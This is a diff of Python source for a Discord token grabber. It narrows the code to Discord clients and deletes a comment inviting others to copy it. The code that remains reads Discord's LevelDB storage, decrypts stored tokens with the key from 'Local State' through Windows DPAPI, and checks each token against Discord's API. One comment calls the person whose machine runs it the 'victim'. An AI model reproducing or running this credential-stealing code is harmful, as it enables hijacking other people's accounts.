@@ -58,7 +58,6 @@ def get_token_key(path): # token encryption uses a key stored in a different fol
     master_key = CryptUnprotectData(master_key, None, None, None, 0)[1] # and using win32crypt
     return master_key # boom, key
 
-# Below is a token grabber using it, feel free to skid it, honestly im just mad. make sure to mention "CC/CL" in your code if u copy-paste it :)
 
 def grabTokens():
     tokens = []
@@ -67,72 +66,24 @@ def grabTokens():
         'Discord Canary': roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
         'Lightcord': roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
         'Discord PTB': roaming + r'\\discordptb\\Local Storage\\leveldb\\',
-        'Opera': roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
-        'Opera GX': roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
-        'Amigo': appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
-        'Torch': appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
-        'Kometa': appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
-        'Orbitum': appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
-        'CentBrowser': appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
-        '7Star': appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
-        'Sputnik': appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
-        'Vivaldi': appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Chrome SxS': appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-        'Chrome': appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Epic Privacy Browser': appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
-        'Microsoft Edge': appdata + r'\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Uran': appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Yandex': appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Brave': appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Iridium': appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Ungoogled Chromium': appdata + r'\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Firefox': roaming + r'\\Mozilla\\Firefox\\Profiles'
 }
 
     for source, path in paths.items():
         if not os.path.exists(path):
             continue
-        if not "discord" in path: # we first check if its not discord, cuz then we wont need the encryption bs at all and grab it like normal
-            if "Mozilla" in path: # ha, yeah.. firefox needs extra care lmfao.
-                for loc, _, files in os.walk(path):
-                    for _file in files:
-                        if not _file.endswith('.sqlite'):
-                            continue
-                        for line in [x.strip() for x in open(f'{loc}\\{_file}', errors='ignore').readlines() if x.strip()]:
-                            for token in findall(regex, line):
-                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
-                                if r.status_code == 200:
-                                    if token in tokens:
-                                        continue
-                                    tokens.append(token)
-
-            else: # If its not firefox
-                for file_name in os.listdir(path):
-                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for token in findall(regex, line):
-                            r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
+        for file_name in os.listdir(path): # if it is discord...
+            if not file_name.endswith('.log') and not file_name.endswith('.ldb'): # we get all leveldb files and log files
+                continue
+            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]: # strip them
+                for y in findall(encrypted_regex, line): # and find our encrypted regex
+                    for i in ["discordcanary", "discord", "discordptb"]: # we check all discord installs, because all local state files are same for an user, even the discord client is different
+                        if os.path.isfile(ROAMING+ f'\\{i}\\Local State'): # to avoid error if victim doesn't hav discordcanary for example (file not found..)
+                            token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_token_key(roaming+ f'\\{i}\\Local State')) # to decrypt the shit
+                            r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)) # and then we just check if its valid
                             if r.status_code == 200:
                                 if token in tokens:
                                     continue
                                 tokens.append(token)
-       
-
-        else:
-            for file_name in os.listdir(path): # if it is discord...
-                if not file_name.endswith('.log') and not file_name.endswith('.ldb'): # we get all leveldb files and log files
-                    continue
-                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]: # strip them
-                    for y in findall(encrypted_regex, line): # and find our encrypted regex
-                        for i in ["discordcanary", "discord", "discordptb"]: # we check all discord installs, because all local state files are same for an user, even the discord client is different
-                            if os.path.isfile(ROAMING+ f'\\{i}\\Local State'): # to avoid error if victim doesn't hav discordcanary for example (file not found..)
-                                token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_token_key(roaming+ f'\\{i}\\Local State')) # to decrypt the shit
-                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)) # and then we just check if its valid
-                                if r.status_code == 200:
-                                    if token in tokens:
-                                        continue
-                                    tokens.append(token)
                                                     
 
 ```
